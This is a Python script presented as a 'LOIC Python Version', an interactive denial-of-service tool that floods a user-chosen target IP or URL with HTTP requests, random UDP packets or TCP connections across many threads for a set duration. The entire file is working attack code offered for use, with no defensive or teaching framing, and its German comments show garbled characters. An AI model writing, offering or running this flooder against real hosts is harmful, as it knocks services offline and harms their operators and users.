import socket
import threading
import time
import random

# Funktion f端r HTTP-Flood-Angriff
def http_flood(target, port, duration, threads, speed):
    timeout = time.time() + duration
    payload = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode('utf-8')

    def flood():
        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target, port))
                sock.send(payload)
                sock.close()
                print(f"HTTP request sent to {target}:{port}")
                time.sleep(speed)
            except Exception as e:
                print(f"Error: {e}")

    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=flood)
        thread.start()
        thread_list.append(thread)

    for thread in thread_list:
        thread.join()

# Funktion f端r UDP-Flood-Angriff
def udp_flood(target, port, duration, threads, speed):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                sock.sendto(payload, (target, port))
                print(f"UDP packet sent to {target}:{port}")
                time.sleep(speed)
            except Exception as e:
                print(f"Error: {e}")

    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=flood)
        thread.start()
        thread_list.append(thread)

    for thread in thread_list:
        thread.join()

# Funktion f端r TCP-Flood-Angriff
def tcp_flood(target, port, duration, threads, speed):
    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target, port))
                sock.send(random._urandom(1024))
                sock.close()
                print(f"TCP packet sent to {target}:{port}")
                time.sleep(speed)
            except Exception as e:
                print(f"Error: {e}")

    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=flood)
        thread.start()
        thread_list.append(thread)

    for thread in thread_list:
        thread.join()

# Hauptmen端
def loic_main():
    while True:
        print("\nLOIC Python Version")
        print("1. HTTP Flood Attack")
        print("2. UDP Flood Attack")
        print("3. TCP Flood Attack")
        print("0. Exit")
        choice = input("Choose an option: ")

        if choice in ["1", "2", "3"]:
            target = input("Enter target IP or URL: ")
            port = int(input("Enter target port: "))
            duration = int(input("Enter attack duration (seconds): "))
            threads = int(input("Enter number of threads (1-100): "))
            speed = float(input("Enter delay between packets (seconds): "))

            if choice == "1":
                http_flood(target, port, duration, threads, speed)
            elif choice == "2":
                udp_flood(target, port, duration, threads, speed)
            elif choice == "3":
                tcp_flood(target, port, duration, threads, speed)
        elif choice == "0":
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    loic_main()
